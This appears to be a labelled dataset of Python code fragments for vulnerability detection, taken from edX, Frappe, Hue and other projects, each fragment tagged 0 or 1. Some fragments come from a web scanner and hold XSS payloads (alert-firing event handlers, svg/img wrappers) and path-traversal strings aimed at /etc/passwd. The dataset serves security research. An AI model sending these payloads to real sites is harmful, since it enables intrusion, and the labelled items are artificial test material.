url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book", "label": 1}, {"snippet_id": 40257, "code": " self.get_valid_dict().items(): \t\t\tif not value or not isinstance(value, string_types): \t\t\t\tcontinue \t\t\tvalue=frappe.as_unicode(value) \t\t\tif(u\"<\" not in value and u\">\" not in value): \t\t\t\t \t\t\t\tcontinue ", "label": 0}, {"snippet_id": 26020, "code": "' 'internal_reference': forms.TextInput, } labels={ 'is_business': '' } def __init__(self, *args, **kwargs): self.event=event=kwargs.pop('event') self.request=kwargs.pop('request', None) self.validate_vat_id", "label": 0}, {"snippet_id": 13908, "code": "]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses", "label": 0}, {"snippet_id": 46471, "code": " response['message']=_('There is no collection to search.') return JsonResponse(response) def no_collections(request): return render('no_collections.mako', request,{'is_embeddable': request.GET.get('is_embeddable", "label": 0}, {"snippet_id": 32069, "code": ".LinkAction): name=\"edit\" verbose_name=_(\"Edit\") url=\"horizon:identity:mappings:update\" classes=(\"ajax-modal\",) icon=\"pencil\" policy_rules=((\"identity\", \"identity:update_mapping\"),) class DeleteMappingsAction", "label": 0}, {"snippet_id": 5970, "code": " README=open(os.path.join(here, 'README')).read() version='0.3.22' install_requires=[ 'pymongo>=2.8,<3', 'pysaml2==1.2.0beta5', 'python-memcached==1.53', 'cherrypy==3.2.4', 'vccs_client==0.4.1', 'eduid_am>", "label": 1}, {"snippet_id": 21275, "code": "<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views.index_shifted'), url(r'^courses/(?P<course_id>[^", "label": 1}, {"snippet_id": 34852, "code": ", convert_dates_to_str=False): \t\tdoc=self.get_valid_dict(convert_dates_to_str=convert_dates_to_str) \t\tdoc[\"doctype\"]=self.doctype \t\tfor df in self.meta.get_table_fields(): \t\t\tchildren=self.get(df.fieldname", "label": 0}, {"snippet_id": 13856, "code": "*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses", "label": 0}, {"snippet_id": 5957, "code": " from setuptools import setup, find_packages import sys, os from distutils import versionpredicate here=os.path.abspath(os.path.dirname(__file__)) README=open(os.path.join(here, 'README')).read() version", "label": 1}, {"snippet_id": 40094, "code": "][0] or None \t\t\tdefault_column_max_length=type_map[df.fieldtype][1] or None \t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length: \t\t\t\tmax_length=cint(df.get(\"length\")) or", "label": 0}, {"snippet_id": 43652, "code": " absolute_value=False, translated=False): \t\tfrom frappe.utils.formatters import format_value \t\tdf=self.meta.get_field(fieldname) \t\tif not df and fieldname in default_fields: \t\t\tfrom frappe.model.meta import", "label": 0}, {"snippet_id": 12025, "code": "[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name", "label": 0}, {"snippet_id": 232, "code": " \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) except: logs.logging.info(\"XSS: No GET", "label": 0}, {"snippet_id": 39624, "code": ": Value missing for{0}:{1}\").format(_(df.parent), _(df.label)) \t\tmissing=[] \t\tfor df in self.meta.get(\"fields\",{\"reqd\":('=', 1)}): \t\t\tif self.get(df.fieldname) in(None,[]) or not strip_html(cstr(self.get", "label": 0}, {"snippet_id": 23913, "code": ".env_var_override.set('VERIFY_XSS', 'True') with self.env_var_override: suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_test_dir", "label": 1}, {"snippet_id": 40737, "code": "\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes: \t\t\t\tto_reset.append(df) \t\tif to_reset: \t\t\tif self.is_new(): \t\t\t\t \t\t\t\tref_doc=frappe.new_doc(self.doctype) \t\t\telse: \t\t\t", "label": 0}, {"snippet_id": 23067, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading", "label": 0}, {"snippet_id": 25397, "code": "{} data['_scheme']=self.scheme_name for i, value in enumerate(data_list): data[self.scheme['fields'][i][0]]=value or '' return data def __init__(self, *args, **kwargs): fields=[] defaults={ 'widget': self", "label": 0}, {"snippet_id": 43666, "code": " fieldname in default_fields: \t\t\tfrom frappe.model.meta import get_default_df \t\t\tdf=get_default_df(fieldname) \t\tval=self.get(fieldname) \t\tif translated: \t\t\tval=_(val) \t\tif absolute_value and isinstance", "label": 0}, {"snippet_id": 18803, "code": " include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$'", "label": 0}, {"snippet_id": 12028, "code": "/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$", "label": 0}, {"snippet_id": 54844, "code": "\"\"\" model=Article success_url='/' def test_func(self): return self.request.user==self.get_object().author class CommentDelete(UserPassesTestMixin, DeleteView): \"\"\"\u5220\u9664\u8bc4\u8bba\u7684\u64cd\u4f5c\"\"\" model=Comment def get_success_url", "label": 0}, {"snippet_id": 47542, "code": ".dect), minimum=0)) f.add_content(PlainText('Number of allowed reservations: ')) f.add_content(NumberField(name='allowed_reservations', button_text=str(profile.number_of_allowed_reservations), minimum=0)", "label": 0}, {"snippet_id": 40246, "code": " frappe.flags.in_install: \t\t\treturn \t\tfor fieldname, value in self.get_valid_dict().items(): \t\t\tif not value or not isinstance(value, string_types): \t\t\t\tcontinue \t\t\tvalue=frappe.as_unicode(value) \t\t\tif", "label": 0}, {"snippet_id": 17097, "code": "[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$'", "label": 0}, {"snippet_id": 10373, "code": " expected_verbosity_string) def test_verbosity_settings_3_processes(self): \"\"\" With the above test, validate that num_processes can be set to various values \"\"\" process_count=3 expected_verbosity_string=( \"", "label": 0}, {"snippet_id": 33349, "code": ".BuildsApi()) return[ webapp2.Route(r'/internal/cron/buildbucket/expire_build_leases', expiration.CronExpireBuildLeases), webapp2.Route(r'/internal/cron/buildbucket/expire_builds', expiration.CronExpireBuilds", "label": 0}, {"snippet_id": 26926, "code": "(hidden_param_name) > 0) and(len(hidden_param_name)==len(hidden_param_value)): for i in range(0,len(hidden_param_name)): post_params[hidden_param_name[i]]=hidden_param_value[i] if method.find(\"get\")==0", "label": 0}, {"snippet_id": 21235, "code": ")/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/", "label": 1}, {"snippet_id": 45324, "code": "=coordinator_data['name'] coordinator_doc.save() response['status']=0 response['id']=coordinator_doc.id response['message']=_('Saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json", "label": 0}, {"snippet_id": 1614, "code": "'scanid'], \"name\": data['name'], \"url\": data['url']}) except: pass return jsonify(scanids) def fetch_records(scanid): vul_list=[] records=db.vulnerabilities.find({\"scanid\":scanid}) print \"Records are \"", "label": 0}, {"snippet_id": 13758, "code": ")/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index", "label": 1}, {"snippet_id": 16675, "code": "<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P", "label": 1}, {"snippet_id": 36856, "code": ".form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe", "label": 1}, {"snippet_id": 20523, "code": " sh( 'tar zxf{zipped_course} -C{courses_dir}'.format( zipped_course=zipped_course, courses_dir=self.imports_dir, ) ) def generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler", "label": 0}, {"snippet_id": 4168, "code": "\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find", "label": 0}, {"snippet_id": 34042, "code": "(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]) \t\tif not post.comments: \t\t\tpost.comment_text=_('No comments yet') \t\telif post.comments=", "label": 0}, {"snippet_id": 40882, "code": ",(tuple, list)): \t\t\t\tif fval is True: \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"): \t\t\t\t\tfval=(\"^\", fval", "label": 0}, {"snippet_id": 16953, "code": ".grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+", "label": 0}, {"snippet_id": 36188, "code": "._precision[cache_key][fieldname] \tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False): \t\tfrom frappe.utils.formatters import format_value \t\tdf=self.meta", "label": 0}, {"snippet_id": 31087, "code": ": \tmaster=form.getvalue('masteradd') \tslave=form.getvalue('slaveadd') \tinterface=form.getvalue('interfaceadd') \tvrrpip=form.getvalue('vrrpipadd') \tkp=form.getvalue('kp') \ttmp_config_path=sql.get_setting", "label": 0}, {"snippet_id": 21226, "code": ".course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware", "label": 0}, {"snippet_id": 18372, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>", "label": 0}, {"snippet_id": 1404, "code": "'], 'res_headers': data['res_headers'], 'res_body': data['res_body'], 'Description': vul['Description'], 'remediation': vul['remediation'] } vul_list.append(all_data) break except: pass print vul_list return", "label": 0}, {"snippet_id": 20181, "code": " them. For example, if the course is located in `test_root/courses/test-example-course/`, self.imports_dir should be `test_root/courses/`. \"\"\" msg=colorize('green', \"Importing courses from{}...\".format", "label": 0}, {"snippet_id": 27894, "code": "')): self.render_json(values, 500) else: self.render('error.html', values, 500) def redirect(self, url, **kwargs): \"\"\"Explicitly converts url to 'str', because webapp2.RequestHandler.redirect strongly requires", "label": 0}, {"snippet_id": 16067, "code": "'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student", "label": 0}, {"snippet_id": 32996, "code": "') as fp: return fp.read() def _WriteHeader(self, content_type='text/plain', status_code=200): self.send_response(status_code) self.send_header('Content-Type', content_type) self.end_headers() def _WriteTemplate", "label": 0}, {"snippet_id": 44020, "code": "\", fval) \t\t\t_filters[f]=fval \tfor d in data: \t\tadd=True \t\tfor f, fval in iteritems(_filters): \t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]): \t\t\t\tadd=False \t\t\t\tbreak \t\tif add: \t\t\tout.append", "label": 0}, {"snippet_id": 11685, "code": ".password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat", "label": 0}, {"snippet_id": 5028, "code": " id=\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>', '<input onfocus=alert(1) autofocus>', '<input onblur=alert(1) autofocus><input autofocus>', '<body onscroll=alert(1)>'", "label": 0}, {"snippet_id": 3092, "code": "]: if res_headers['Content-Type'].find('application/json') !=-1 or res_headers['Content-Type'].find('text/plain') !=-1: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_payload_decode", "label": 0}, {"snippet_id": 26306, "code": " self.instance.vat_id=normalized_id except(vat_moss.errors.InvalidError, ValueError): raise ValidationError(_('This VAT ID is not valid. Please re-check your input.')) except vat_moss.errors.WebServiceUnavailableError", "label": 0}, {"snippet_id": 17974, "code": " key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME", "label": 0}, {"snippet_id": 44231, "code": " check_document_access_permission, check_document_modify_permission from oozie.forms import ParameterForm from oozie.models2 import Node, Workflow, Coordinator, Bundle, NODES, WORKFLOW_NODE_PROPERTIES,", "label": 0}, {"snippet_id": 39465, "code": " show_unique_validation_message(self, e): \t\ttype, value, traceback=sys.exc_info() \t\tfieldname, label=str(e).split(\"'\")[-2], None \t\t \t\t \t\tif \"unique_\" in fieldname: \t\t\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self", "label": 0}, {"snippet_id": 32888, "code": "\"Breadcrumbs-crumb\">%s</a>\\n' % self.path) self.wfile.write('</div>\\n') for _, dirs, files in os.walk(full_path): for f in sorted(files): if f.startswith('.'): continue if f.endswith('.md'): bold=('<b>', '</b", "label": 1}, {"snippet_id": 27012, "code": " _url.find(\"https://\")==0: furl=\"https://\" +host +\"/\" +page else: furl=\"http://\" +host +\"/\" +page print \"[+] LFI check for: \" +furl if DEBUG==1: print \"Params: \" print params print hidden_param_name print", "label": 0}, {"snippet_id": 4760, "code": "'onsuspend', 'ontimeupdate', 'ontoggle', 'ontouchcancel', 'ontouchend', 'ontouchmove', 'ontouchstart', 'ontransitionend', 'onunload', 'onvolumechange', 'onwaiting', 'onwebkitanimationend', 'onwebkitanimationiteration", "label": 0}, {"snippet_id": 14235, "code": "'django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):", "label": 0}, {"snippet_id": 52970, "code": ".uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] if coordinator_id and not filter(lambda a: a['uuid']==coordinator.data['properties", "label": 0}, {"snippet_id": 41449, "code": " reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start", "label": 0}, {"snippet_id": 6584, "code": "._parsed_content_packages: return self._parsed_content_packages value=self.config.get(self.section, 'content_packages') res=[] for this in value.split(','): this=this.strip() name, _sep, path,=this.partition(':'", "label": 0}, {"snippet_id": 14185, "code": "<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab", "label": 0}, {"snippet_id": 190, "code": " parsed_url=='': parsed_url=url xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) logs.logging.info(\"%s is", "label": 0}, {"snippet_id": 50333, "code": " csessid}) def mode_keepalive(self, request): \"\"\" This is called by render_POST when the client is replying to the keepalive. \"\"\" csessid=request.args.get('csessid')[0] self.last_alive[csessid]=(time.time(),", "label": 0}, {"snippet_id": 45952, "code": "\"size\":2,\"rows\":[{\"widgets\":[]}],\"drops\":[\"temp\"],\"klass\":\"card card-home card-column span2\"}, {\"size\":10,\"rows\":[{\"widgets\":[ {\"size\":12,\"name\":\"Filter Bar\",\"widgetType\":\"filter-widget\", \"id\":\"99923aef", "label": 0}, {"snippet_id": 14968, "code": " of verbosity and number of processors is passed in, a BuildFailure should be raised \"\"\" suite=BokChoyTestSuite('', num_processes=2, verbosity=3) with self.assertRaises(BuildFailure): BokChoyTestSuite.verbosity_processes_string", "label": 0}, {"snippet_id": 42349, "code": " default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"): \t\t\tif self.get(key): \t\t\t\tdoc[key]=self.get(key) \t\treturn doc \tdef as_json(self)", "label": 0}, {"snippet_id": 5162, "code": " @classmethod def acmehttp01(cls, url): return url +'/.well-known/acme-challenge/?<h1>hi' def img(self, payload): return '<img/onerror=\"%s\"/src=x>' % payload def svg(self, payload): return '<svg/onload=\"%s\"/>' ", "label": 0}, {"snippet_id": 21526, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]", "label": 0}, {"snippet_id": 3227, "code": ",body,scanid=None): temp_headers={} temp_headers.update(headers) xss_payloads=fetch_xss_payload() for payload in xss_payloads: parse_domain=urlparse.urlparse(url).netloc host_header={\"Host\": parse_domain", "label": 0}, {"snippet_id": 15784, "code": "), \"VERIFY_XSS='{}'\".format(self.verify_xss), \"nosetests\", test_spec, \"{}\".format(self.verbosity_processes_string()) ] if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save", "label": 0}, {"snippet_id": 44784, "code": "} parameters=set() try: node_data=json.loads(request.POST.get('node', '{}')) parameters=parameters.union(set(Node(node_data).find_parameters())) script_path=node_data.get('properties',{}).get('script_path", "label": 0}, {"snippet_id": 21476, "code": "\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)", "label": 0}, {"snippet_id": 41331, "code": "\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route", "label": 0}, {"snippet_id": 3429, "code": " \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate", "label": 0}, {"snippet_id": 29246, "code": "\t\tssh=ssh_connect(serv) \texcept Exception as e: \t\terror=e \t\tpass \ttry: \t\tsftp=ssh.open_sftp() \t\tfile=sftp.put(file, full_path) \t\tsftp.close() \t\tssh.close() \texcept Exception as e: \t\terror=e \t\tpass \t\t \treturn", "label": 0}, {"snippet_id": 20054, "code": ") def verbosity_processes_string(self): \"\"\" Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct the proper combination for use with nosetests. \"\"\" substring=[] if", "label": 0}, {"snippet_id": 29634, "code": "<div class='alert alert-warning'>\"+line+\"</div>\") \ttry:\t \t\tssh.close() \texcept: \t\tprint(\"<div class='alert alert-danger' style='margin: 0;'>\"+str(ssh)+\"<a title='Close' id='errorMess'><b>X</b></a></div>\"", "label": 0}, {"snippet_id": 13786, "code": "+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware", "label": 1}, {"snippet_id": 42446, "code": "\tdoctype=self.doctype, \t\t\t\t\tcolumns=\", \".join([\"`\"+c+\"`\" for c in columns]), \t\t\t\t\tvalues=\", \".join([\"%s\"] * len(columns)) \t\t\t\t), list(d.values())) \t\texcept Exception as e: \t\t\tif e.args[0]==1062: \t\t\t\tif", "label": 0}, {"snippet_id": 21992, "code": "?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$", "label": 0}, {"snippet_id": 17048, "code": ", name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/", "label": 0}, {"snippet_id": 24691, "code": ".sh\".format(Env.REPO_ROOT)) if not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming", "label": 0}, {"snippet_id": 38418, "code": "('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar", "label": 0}, {"snippet_id": 12602, "code": ".peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),", "label": 0}, {"snippet_id": 49615, "code": ".get_columns() self.filters=[ SmartFilter(self.model, field, self.query_params, self.object_list) for i, field in enumerate(self.list_filter, start=1) ] if self.list_filter else[] def get_columns(self):", "label": 0}, {"snippet_id": 24700, "code": " bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming servers are running...\") print msg bokchoy_utils.start_servers(self.default_store,", "label": 0}, {"snippet_id": 34113, "code": " frappe.model import default_fields from frappe.model.naming import set_new_name from frappe.model.utils.link_count import notify_link_count from frappe.modules import load_doctype_module from frappe.model", "label": 0}, {"snippet_id": 26459, "code": " '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd', '../../../../../etc/passwd', '../../../../../../etc/passwd', '../../../../../../../etc/passwd', '../../../../../../../../etc/passwd", "label": 0}, {"snippet_id": 37091, "code": "\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1", "label": 0}, {"snippet_id": 48175, "code": "[\"category\"] text=request.POST[\"text\"] file=request.FILES['file'] user: Profile=get_current_user(request) handle_file(user, headline, category, text, file) except Exception as e: return redirect(\"/admin", "label": 0}, {"snippet_id": 46321, "code": "-2450-f77e02e1a5c0\",\"widgetType\":\"resultset-widget\", \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}], \"drops\":[\"temp\"],\"klass\":\"card card-home card-column span10\"} ], ", "label": 0}, {"snippet_id": 7175, "code": "), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware", "label": 0}, {"snippet_id": 8701, "code": "\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX", "label": 0}, {"snippet_id": 1826, "code": "(res_headers): print \"response header\",res_headers['Content-Type'] if res_headers['Content-Type']: if res_headers['Content-Type'].find('application/json') !=-1 or res_headers['Content-Type'].find('text/plain", "label": 0}, {"snippet_id": 42585, "code": "\tif \"unique_\" in fieldname: \t\t\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname))) ", "label": 0}, {"snippet_id": 49391, "code": ") def is_active(self): if self.field_name in self.query_params: selected_value=self.query_params[self.field_name] if type(selected_value)==list: selected_value=selected_value[0] if selected_value==self", "label": 0}, {"snippet_id": 53552, "code": "': job_id})) else: request.error(_('Invalid submission form: %s' % params_form.errors)) else: parameters=bundle.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'", "label": 0}, {"snippet_id": 50409, "code": "): \"\"\" This is called by render_POST when the client is telling us that it is ready to receive data as soon as it is available. This is the basis of a long-polling(comet) mechanism: the server will wait", "label": 0}, {"snippet_id": 50231, "code": " if csessid in self.requests: self.requests[csessid].finish() del self.requests[csessid] if csessid in self.databuffer: del self.databuffer[csessid] def mode_init(self, request): \"\"\" This is called by render_POST", "label": 0}, {"snippet_id": 1766, "code": "\"Access-Control-Allow-Origin\"]=\"*\" return resp @app.route('/', defaults={'page': 'scan.html'}) @app.route('/<page>') def view_dashboard(page): return render_template('{}'.format(page)) app.run(host='0.0", "label": 0}, {"snippet_id": 50598, "code": "(request) else: return '\"\"' class AjaxWebClientSession(session.Session): \"\"\" This represents a session running in an AjaxWebclient. \"\"\" def __init__(self, *args, **kwargs): self.protocol_key=\"webclient/ajax\"", "label": 0}, {"snippet_id": 38773, "code": "\tdef getone(self, key, filters=None): \t\treturn self.get(key, filters=filters, limit=1)[0] \tdef set(self, key, value, as_value=False): \t\tif isinstance(value, list) and not as_value: \t\t\tself.__dict__[key", "label": 0}, {"snippet_id": 41151, "code": "\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context", "label": 0}, {"snippet_id": 40578, "code": " isinstance(val,(int, float)): \t\t\tval=abs(self.get(fieldname)) \t\tif not doc: \t\t\tdoc=getattr(self, \"parent_doc\", None) or self \t\treturn format_value(val, df=df, doc=doc, currency=currency) \tdef is_print_hide", "label": 0}, {"snippet_id": 7602, "code": "/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views.index_shifted'), url(r'^courses", "label": 1}, {"snippet_id": 4393, "code": "): return '<input/onfocus=\"%s\"/autofocus>' % payload def marquee(self, payload): return '<marquee/onstart=\"%s\"></marquee>' % payload def div(self, payload): return '<div/onwheel=\"%s\"/style=\"height:200%", "label": 0}, {"snippet_id": 15800, "code": "-with-save-baseline\") cmd.append(self.extra_args) cmd=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment with mega-course loaded, and runs pa11ycralwer against", "label": 0}, {"snippet_id": 44902, "code": " mimetype=\"application/json\") def gen_xml_workflow(request): response={'status': -1} try: workflow_json=json.loads(request.POST.get('workflow', '{}')) workflow=Workflow(workflow=workflow_json) response", "label": 0}, {"snippet_id": 23505, "code": " if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration", "label": 0}, {"snippet_id": 21005, "code": " continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' ", "label": 0}, {"snippet_id": 16668, "code": ".views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',", "label": 0}, {"snippet_id": 4461, "code": ": '\\u0440', 'r': '\\u0433', 'q': '\\u051B', 's': '\\u0455', 'w': '\\u051D', 'x': '\\u0445', 'y': '\\u0443', } def __init__(self): super(Code, self).__init__() @staticmethod def fuzzAscii(): for i in xrange(256", "label": 0}, {"snippet_id": 21760, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns", "label": 0}, {"snippet_id": 38677, "code": ") is None) and(value is not None) and(key not in self.dont_update_if_missing): \t\t\t\tself.set(key, value) \tdef get_db_value(self, key): \t\treturn 